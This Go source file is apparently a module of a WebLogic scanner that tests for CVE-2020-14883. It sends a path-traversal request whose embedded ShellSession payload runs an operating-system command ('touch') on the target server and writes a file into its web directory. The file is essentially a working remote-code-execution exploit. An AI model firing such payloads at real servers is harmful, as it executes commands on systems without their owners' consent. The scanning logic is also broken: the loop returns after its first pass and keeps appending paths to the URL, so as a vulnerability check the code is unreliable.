package cve_2020_14883

import (
	"WeblogicScan/config"
	"github.com/gookit/color"
)

func cve_2020_14883(url string) {
	paths := []string{"/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch%20../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/css/test.txt%27);%22)", "/console/framework/skins/wlsconsole/css/test.txt"}
	for _, path := range paths {
		url = url + path
		resp, err := config.Client.R().
			SetHeader("User-Agent", config.Fakeua()).
			Get(url)
		if err != nil { // Error handling.
			color.Red.Printf("[-] Target weblogic not detected CVE-2020-14883\n")
			return
		}
		if resp.Status == "200" {
			color.Green.Printf("*Found cve-2020-14883！")
			return
		} else {
			color.Red.Printf("[-] Target weblogic not detected CVE-2020-14883\n")
			return
		}
		return
	}
}
func Run(u string, port string) {
	url := "http://" + u + ":" + port
	cve_2020_14883(url)
}
